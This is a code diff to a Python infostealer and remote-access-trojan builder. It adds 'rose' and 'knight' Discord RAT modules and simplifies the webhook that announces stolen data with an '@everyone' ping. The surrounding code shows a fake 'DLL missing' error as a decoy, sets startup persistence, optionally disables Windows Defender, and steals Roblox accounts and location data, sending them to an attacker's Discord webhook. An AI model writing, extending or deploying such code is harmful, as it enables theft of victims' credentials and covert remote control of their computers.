@@ -2,7 +2,7 @@ import _webhook
 import discordc
 import informations
 import malicious
-import rat
+import rose_rat
 import InjectX
 import startup
 import _roblox
@@ -11,7 +11,6 @@ from anonFile import uploadToAnonfiles
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
-
 import getpass
 import platform
 import ctypes
@@ -45,7 +44,7 @@ if cc.get_fake_error() is True:
     ctypes.windll.user32.MessageBoxW(0, "The program can't start because VLg7.ll is missing from your computer. Try reinstalling the program to fix this problem", "DDL missing", 16)
 
 if cc.get_start_up() is True:
-    startup.start_up()
+    startup.Startup()
 
 if cc.get_defenderfucker() is True:
     import defenderfucker
@@ -78,25 +77,13 @@ Threadlist = []
 DETECTED = False
 
 if cc.get_discord_ping():
-    payload1 = {
+    ping = {
         "content":
-        "<:pikachusign:1084901293669220422> **AYOOO GRABBED SOME DUMMY** ||@everyone||",
+        "<a:arrow:1062070385455157368> **Logged data from someone. Sending it now.** ||@everyone|| <a:FrogHypers:1124963514239438918>",
         "username": wh_name,
         "avatar_url": wh_avatar,
     }
-    payload2 = {
-        "content": "https://cdn.discordapp.com/emojis/1084901411768238190.gif",
-        "username": wh_name,
-        "avatar_url": wh_avatar,
-    }
-    payload3 = {
-        "content": "https://cdn.discordapp.com/emojis/1084901431531798641.gif",
-        "username": wh_name,
-        "avatar_url": wh_avatar,
-    }
-    response = requests.post(webhook, json=payload1)
-    response = requests.post(webhook, json=payload2)
-    response = requests.post(webhook, json=payload3)
+    response = requests.post(webhook, json=ping)
 
 
 class DATA_BLOB(Structure):
@@ -866,5 +853,8 @@ if cc.get_roblox_stealing() is True:
 if cc.get_location_stealing() is True:
     _webh.locations_webhook(ii.global_info())
 
-if cc.get_discord_rat() is True:
-    rat.run_rat()
+if cc.get_rose_discord_rat() is True:
+    rose_rat.run_rat()
+    
+if cc.get_knight_discord_rat() is True:
+    import knight_rat
